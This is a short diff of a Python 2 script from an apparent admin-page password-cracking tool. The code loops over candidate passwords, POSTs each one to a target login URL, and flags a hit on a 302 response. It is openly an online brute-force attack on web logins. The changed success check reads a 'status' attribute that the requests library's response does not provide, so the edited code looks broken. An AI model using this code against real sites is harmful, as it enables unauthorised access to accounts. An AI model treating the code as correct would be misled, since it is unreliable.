@@ -189,6 +189,7 @@ def check_for_update():
         http = urllib2.urlopen('https://raw.githubusercontent.com/HydraBoy/AdminPageCracker/master/version.txt',data=None)
         content = http.read()
         read = open('version.txt','r').read()
+        print read,content
         if read == content:
             print '[#] No updates available.'
         else:
@@ -212,13 +213,16 @@ def FindPassword(username, word, url):
         http = requests.post(url, data={'username':user,'password':password,'submit':'submit'})
         content = http.content.decode('utf-8')
         print(Fore.GREEN+"[#] Checking Password: [" + str(password)+ "]")
-        if "Welcome" in content:
+        if http.status == 302:
             print (Fore.RED+'[+] Password Found : '+ password)
             break
         else :
             print ('[!] Password Not Found : '+ password)
 
-    print (Fore.GREEN + 'Scan Ended ')
+    print (Fore.GREEN + '[#] Scan Ended. ')
+    raw_input(Fore.GREEN+"[!] Press Enter To Continue.")
+    os.popen('clear')
+    Welcome()
 
 def IsUrl(source,url):
     if 'https://' not in str(url):
